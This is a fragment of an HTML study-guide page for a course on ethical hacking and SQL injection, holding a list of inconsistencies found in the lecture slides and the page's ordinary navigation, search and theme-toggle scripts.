+</div><ul><li>Slide 2 mentions &#x27;three knowledge checks&#x27; but the deck contains six — one after each part (slides 10, 15, 19, 23, 29, and 32).</li><li>Slide 2 says the session runs 90 minutes, while the title slide lists a 2-hour lecture plus a 2-hour lab.</li><li>Slide 4 says &#x27;4 techniques&#x27; but its coverage map lists five, including out-of-band. Slide 24 says SQLMap automates &#x27;all four sub-types&#x27; while its table lists five rows.</li><li>Slide 28 describes SQLMap&#x27;s blind enumeration as binary search with LIKE patterns. Check this against the SQLMap documentation.</li><li>The OOB example on slide 22 pairs an <code class='icode'>INTO OUTFILE</code> write with a comment about <code class='icode'>LOAD_FILE()</code> (a read function) on Windows. Both need file privileges but behave differently — treat as illustrative.</li><li>Slide 29 suggests <code class='icode'>--level=3 --risk=2</code>, while slide 33 suggests <code class='icode'>--level=5 --risk=3</code>. Both are reasonable but differ in runtime and aggressiveness.</li></ul>
+</section>
+
+    </main>
+</div>
+
+<!-- Search Modal -->
+<div class="search-modal-backdrop" id="searchModalBackdrop" onclick="handleBackdropClick(event)">
+    <div class="search-modal-dialog">
+        <div class="search-modal-header">
+            <svg viewBox="0 0 24 24" width="18" height="18" stroke="var(--accent-rose)" fill="none" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+            <input type="text" id="globalSearchInput" placeholder="Search this guide..." autocomplete="off" spellcheck="false">
+            <button class="search-modal-close" onclick="closeSearchModal()">ESC</button>
+        </div>
+        <ul class="search-results-list" id="searchResultsList"></ul>
+    </div>
+</div>
+
+<!-- Mobile floating nav -->
+<div class="mobile-floating-nav">
+    <button class="floating-btn floating-toc-btn" onclick="toggleMobileMenu()">☰ Contents</button>
+    <button class="floating-btn floating-top-btn" id="floatingTopBtn" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+</div>
+
+<!-- Footer -->
+<footer class="app-footer">
+    <div class="footer-left">
+        <span>CCY4202 Ethical Hacking and Penetration Testing · Week 4 — SQL Injection</span>
+    </div>
+    <div>
+        <button class="footer-btn" onclick="window.print()">🖨️ Print / Save PDF</button>
+    </div>
+</footer>
+
+<script>
+// ── Theme ──────────────────────────────────────────────────────────────────────
+function toggleTheme() {
+    const root = document.documentElement;
+    const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    root.setAttribute('data-theme', next);
+    localStorage.setItem('w4-theme', next);
+}
+(function() {
+    const t = localStorage.getItem('w4-theme');
+    if (t) document.documentElement.setAttribute('data-theme', t);
+})();
+
+// ── Reading Progress ───────────────────────────────────────────────────────────
+const bar = document.getElementById('readingProgressBar');
+window.addEventListener('scroll', () => {
+    const h = document.documentElement;
+    const pct = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+    bar.style.width = pct + '%';
+}, { passive: true });
+
+// ── Back-to-Top ────────────────────────────────────────────────────────────────
+const floatingTopBtn = document.getElementById('floatingTopBtn');
+window.addEventListener('scroll', () => {
+    floatingTopBtn.classList.toggle('visible', window.scrollY > 400);
+}, { passive: true });
+
+// ── Active TOC ─────────────────────────────────────────────────────────────────
+const tocItems = document.querySelectorAll('.toc-item');
+const sections = document.querySelectorAll('.content-card[id]');
+const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) {
+            const id = entry.target.id;
+            tocItems.forEach(item => {
+                item.classList.toggle('active', item.dataset.target === id);
+            });
+        }
+    });
+}, { rootMargin: '-64px 0px -55% 0px', threshold: 0 });
+sections.forEach(s => observer.observe(s));
+
+// ── Mobile Sidebar ─────────────────────────────────────────────────────────────
+const sidebar = document.getElementById('sidebarNav');
+const backdrop = document.getElementById('sidebarBackdrop');
+function toggleMobileMenu() {
+    const isOpen = sidebar.classList.contains('mobile-open');
+    isOpen ? closeMobileMenu() : openMobileMenu();
+}
+function openMobileMenu() {
+    sidebar.classList.add('mobile-open');
+    backdrop.classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+function closeMobileMenu() {
+    sidebar.classList.remove('mobile-open');
+    backdrop.classList.remove('active');
+    document.body.style.overflow = '';
+}
+// Close on TOC link click on mobile
+sidebar.querySelectorAll('.toc-link').forEach(link => {
+    link.addEventListener('click', () => { if (window.innerWidth <= 1024) closeMobileMenu(); });
+});
+
+// ── Q&A Toggle ────────────────────────────────────────────────────────────────
+function toggleQA(headerEl) {
+    const card = headerEl.closest('.qa-card');
+    card.classList.toggle('open');
+}
+function toggleAllQA(btn) {
+    const cards = btn.closest('.quiz-container').querySelectorAll('.qa-card');
+    const anyOpen = [...cards].some(c => c.classList.contains('open'));
+    cards.forEach(c => c.classList.toggle('open', !anyOpen));
+    btn.textContent = anyOpen ? 'Reveal All' : 'Hide All';
+}
+
+// ── Copy Code ─────────────────────────────────────────────────────────────────
+function copyCode(btn) {
+    const text = btn.closest('.terminal-card').querySelector('.terminal-code').textContent;
+    const done = () => {
+        const o = btn.textContent;
+        btn.textContent = '✓ Copied!'; btn.style.color = 'var(--accent-emerald)';
+        setTimeout(() => { btn.textContent = o; btn.style.color = ''; }, 1800);
+    };
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).then(done);
+    } else {
+        const t = document.createElement('textarea');
+        t.value = text; document.body.appendChild(t); t.select();
+        document.execCommand('copy'); t.remove(); done();
+    }
+}
+
+// ── Search Modal ──────────────────────────────────────────────────────────────
+const esc = x => x.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const SEARCH_INDEX = (() => {
+    const results = [];
+    document.querySelectorAll('.content-card').forEach(card => {
+        const id = card.id;
+        const heading = card.querySelector('.section-heading');
+        if (!heading) return;
+        const title = heading.textContent.trim();
+        const body = card.textContent.trim();
+        // Index paragraphs, headings
+        card.querySelectorAll('p, h3, li').forEach(el => {
+            const text = el.textContent.trim();
+            if (text.length > 15)
+                results.push({ id, sectionTitle: title, text: text.substring(0, 80) + (text.length > 80 ? '…' : '') });
+        });
+    });
+    return results;
+})();
+
+function openSearchModal() {
+    document.getElementById('searchModalBackdrop').classList.add('open');
+    setTimeout(() => document.getElementById('globalSearchInput').focus(), 50);
+}
+function closeSearchModal() {
+    document.getElementById('searchModalBackdrop').classList.remove('open');
+    document.getElementById('globalSearchInput').value = '';
+    document.getElementById('searchResultsList').innerHTML = '';
+}
+function handleBackdropClick(e) {
+    if (e.target === e.currentTarget) closeSearchModal();
+}
+document.getElementById('globalSearchInput').addEventListener('input', function() {
+    const q = this.value.trim().toLowerCase();
+    const list = document.getElementById('searchResultsList');
+    if (q.length < 2) { list.innerHTML = ''; return; }
+    const hits = SEARCH_INDEX.filter(r => r.text.toLowerCase().includes(q) || r.sectionTitle.toLowerCase().includes(q)).slice(0, 12);
+    list.innerHTML = hits.map(h =>
+        `<li><a class="search-result-item" href="#${h.id}" onclick="closeSearchModal()">
+            <div class="result-main">
+                <span class="result-title">${esc(h.sectionTitle)}</span>
+                <span class="result-sec">${esc(h.text)}</span>
+            </div>
+            <span class="result-badge">Go →</span>
+        </a></li>`
+    ).join('') || '<li style="padding:14px 16px;color:var(--text-muted);font-size:13px">No results found.</li>';
+});
+document.addEventListener('keydown', e => {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') { e.preventDefault(); openSearchModal(); }
+    if (e.key === 'Escape') closeSearchModal();
+});
+</script>
+<!-- home-btn -->
+<style>
+.home-fab,.author-tag{position:fixed;bottom:calc(14px + env(safe-area-inset-bottom));z-index:2000;font-family:system-ui,-apple-system,sans-serif;line-height:1}
+.home-fab{left:calc(14px + env(safe-area-inset-left));display:inline-flex;align-items:center;gap:8px;min-height:44px;padding:0 18px;border-radius:999px;background:#10b981;color:#06251b;font-weight:700;font-size:14px;text-decoration:none;box-shadow:0 6px 18px rgba(0,0,0,.4);-webkit-tap-highlight-color:transparent}
+.home-fab:hover,.home-fab:active{background:#06b6d4}
+.author-tag{right:calc(14px + env(safe-area-inset-right));padding:8px 12px;border-radius:8px;background:rgba(15,23,42,.88);color:#94a3b8;font-weight:600;font-size:12px;max-width:45vw;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;pointer-events:none}
+.author-tag b{color:#10b981}
+@media(max-width:600px){
+.home-fab{width:48px;height:48px;min-height:48px;padding:0;justify-content:center;font-size:22px}
+.home-fab span{display:none}
+.author-tag{font-size:11px;padding:6px 10px;bottom:calc(22px + env(safe-area-inset-bottom))}
+}
+@media print{.home-fab,.author-tag{display:none}}
+</style>
+<a class="home-fab" href="index.html" aria-label="Back to Home">&#8962;<span> Home</span></a>
+<div class="author-tag">Author: <b>Zaneso</b></div>
+<!-- /home-btn -->
+</body>
+</html>
